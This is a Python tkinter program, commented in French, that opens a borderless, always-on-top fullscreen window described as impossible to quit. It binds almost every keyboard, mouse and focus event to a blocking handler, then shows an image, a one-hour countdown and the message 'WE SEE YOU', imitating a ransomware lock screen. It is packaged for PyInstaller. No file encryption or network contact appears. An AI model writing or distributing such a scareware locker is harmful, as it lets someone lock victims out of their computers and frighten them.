import tkinter as tk
import os
import sys


def resource_path(relative_path):
    """Get absolute path to resource, works for dev and for PyInstaller"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

class FullScreenBlocker:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_window()
        self.block_all_inputs()
        self.create_interface()

    def setup_window(self):
        """Configuration fenêtre plein écran impossible à quitter"""
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.configure(bg="black")

        self.root.geometry("{0}x{1}+0+0".format(
            self.root.winfo_screenwidth(),
            self.root.winfo_screenheight()
        ))

        self.root.focus_force()

    def block_all_inputs(self):
        """Bloque toutes les touches et la souris"""
        def block_everything(event=None):
            return "break"

        events = [
            "<Key>", "<KeyPress>", "<KeyRelease>",
            "<Escape>", "<F1>", "<F2>", "<F3>", "<F4>",
            "<F5>", "<F6>", "<F7>", "<F8>", "<F9>",
            "<F10>", "<F11>", "<F12>", "<Alt_L>", "<Alt_R>"          
            , "<Control_L>", "<Control_R>",
            "<Shift_L>", "<Shift_R>", "<Win_L>", "<Win_R>",
            "<Tab>", "<Caps_Lock>", "<Num_Lock>", "<Scroll_Lock>",
            "<Print>", "<Pause>", "<Insert>", "<Delete>",
            "<Home>", "<End>", "<Page_Up>", "<Page_Down>",
            "<Up>", "<Down>", "<Left>", "<Right>",
            "<Button>", "<ButtonPress>", "<ButtonRelease>",
            "<B1-Motion>", "<B2-Motion>", "<B3-Motion>",
            "<Motion>", "<Enter>", "<Leave>", "<MouseWheel>",
            "<Double-Button-1>", "<Triple-Button-1>",
            "<FocusIn>", "<FocusOut>", "<Activate>", "<Deactivate>",
            "<Map>", "<Unmap>", "<Configure>", "<Destroy>"
        ]

        for event in events:
            self.root.bind_all(event, block_everything)

    def create_interface(self):
        """Crée l'interface avec image, timer et texte en bas"""
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(expand=True, fill="both")

        try:
            image_path = resource_path("image.png")
            image = tk.PhotoImage(file=image_path)
            img_label = tk.Label(main_frame, image=image, bg="black")
            img_label.image = image
            img_label.pack(pady=(50, 20))
        except:
            img_label = tk.Label(main_frame, text="[IMAGE]", fg="red", bg="black", font=("Arial", 24))
            img_label.pack(pady=(50, 20))

        
        self.text_label = tk.Label(
            main_frame,
            text="01:00:00",
            fg="white",
            bg="black",
            font=("Segoe UI", 40)
        )
        self.text_label.pack(pady=(0, 40))

        
        self.bottom_label = tk.Label(
            main_frame,
            text="WE SEE YOU",
            fg="white",
            bg="black",
            font=("Segoe UI", 26)
        )
        self.bottom_label.pack(pady=(20, 40))
        
        self.remaining = 3600  

        self.update_timer()

    def update_timer(self):
        """Met a jour le timer chaque seconde"""
        if self.remaining >= 0:
            h = self.remaining // 3600
            m = (self.remaining % 3600) // 60
            s = self.remaining % 60

            self.text_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")

            self.remaining -= 1
            self.root.after(1000, self.update_timer)

if __name__ == "__main__":
    app = FullScreenBlocker()
    app.root.mainloop()
